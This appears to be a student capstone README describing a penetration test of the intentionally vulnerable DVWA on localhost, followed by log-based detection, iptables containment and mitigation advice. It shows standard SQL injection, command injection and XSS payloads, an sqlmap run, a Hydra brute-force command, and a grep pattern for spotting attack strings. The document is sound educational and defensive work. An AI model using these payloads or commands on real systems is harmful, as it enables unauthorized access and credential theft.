# Task-5-Capstone-Project-Incident-Response
---
# 🔐 DVWA Web Application Penetration Testing & Incident Response 

## 📌 Project Description

This repository contains a complete **Web Application Penetration Testing and Incident Response Capstone Project** performed on the **Damn Vulnerable Web Application (DVWA)** in a controlled laboratory environment.

The project demonstrates the full lifecycle of a security assessment:

* Environment setup
* Reconnaissance and vulnerability discovery
* Exploitation of web vulnerabilities
* Log-based incident detection
* Incident response simulation
* Mitigation and security recommendations

All testing was conducted **legally and ethically** on an intentionally vulnerable application for educational purposes.

---

## 🎯 Project Objectives

* Identify common OWASP Top 10 web vulnerabilities
* Exploit vulnerabilities using manual and automated techniques
* Collect and analyze Apache web server logs
* Detect indicators of compromise (IoCs)
* Perform incident response actions (Detection, Containment, Eradication, Recovery)
* Document findings with screenshots and evidence

---

## 🧪 Lab Environment

* **Operating System:** Kali Linux
* **Target Application:** Damn Vulnerable Web Application (DVWA)
* **Web Server:** Apache2
* **Database:** MySQL / MariaDB
* **DVWA Security Level:** LOW (during testing)

---

## 🛠 Tools and Technologies

* Nmap – Service discovery
* SQLmap – Automated SQL Injection testing
* Hydra – Brute force attack simulation
* Apache Access Logs – Incident detection
* iptables – Firewall-based containment
* Linux CLI tools

---

## ⚙️ Environment Setup (Summary)

DVWA was installed on a local Apache server and configured with a MySQL database. The application was accessed through a web browser and initialized using the default DVWA setup interface.

---

## 🔍 Reconnaissance

Service discovery was conducted to identify exposed services on the target system.

### Command Used

```bash
nmap -sV -p 80 127.0.0.1
```

**Result:**
The scan confirmed that Apache was running on port 80, exposing the DVWA web application.

---

## 🔥 Vulnerability Exploitation

### 🧨 SQL Injection

**Payload Used:**

```sql
' OR '1'='1 --
```

**Impact:**

* Authentication bypass
* Unauthorized access to database records

Automated testing was also performed using SQLmap.

```bash
sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=<session_id>" --dbs
```

---

### 💻 Command Injection

**Payload Used:**

```bash
127.0.0.1; whoami
```

**Impact:**

* Execution of arbitrary system commands
* Potential system compromise

---

### 🧠 Cross-Site Scripting (XSS)

**Payload Used:**

```html
<script>alert('XSS')</script>
```

**Impact:**

* Client-side script execution
* Potential session hijacking and credential theft

---

### 🔓 Brute Force Attack

A brute force attack was simulated against the DVWA login page using Hydra.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
127.0.0.1 http-post-form \
"/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect"
```

**Impact:**

* Weak credentials successfully compromised

---

## 📊 Incident Detection & Log Analysis

Apache access logs were analyzed to detect malicious activity generated during exploitation.

### Log File Monitored

```bash
/var/log/apache2/access.log
```

### Indicators of Compromise (IoCs)

* SQL Injection payloads (`OR 1=1`)
* Command injection (`whoami`)
* XSS payloads (`<script>`)

### Detection Commands

```bash
sudo grep -Ei "script|whoami|or.*1=1" /var/log/apache2/access.log
```

---

## 🚨 Incident Response Simulation

### 🔍 Detection

Suspicious HTTP requests containing known attack payloads were identified through log analysis.

### 🛑 Containment

The attacker IP address was blocked using firewall rules.

```bash
sudo iptables -A INPUT -s 127.0.0.1 -j DROP
```

Verification:

```bash
sudo iptables -L
```

---

### 🧹 Eradication

* DVWA security level increased
* Vulnerable configurations hardened
* Apache service restarted

```bash
sudo systemctl restart apache2
```

---

### 🔁 Recovery

Application functionality was verified and logs were continuously monitored.

```bash
curl http://127.0.0.1/DVWA
sudo tail -f /var/log/apache2/access.log
```

---

## 🛡 Mitigation & Recommendations

| Vulnerability     | Recommended Mitigation                       |
| ----------------- | -------------------------------------------- |
| SQL Injection     | Parameterized queries, prepared statements   |
| Command Injection | Input validation, command whitelisting       |
| XSS               | Output encoding, input sanitization          |
| Brute Force       | Account lockout, rate limiting               |
| Logging           | Centralized logging and real-time monitoring |

---

## ⚠️ Disclaimer

This project was performed **strictly for educational purposes** in a controlled lab environment.
No production or external systems were targeted.
Unauthorized penetration testing is illegal and unethical.

---
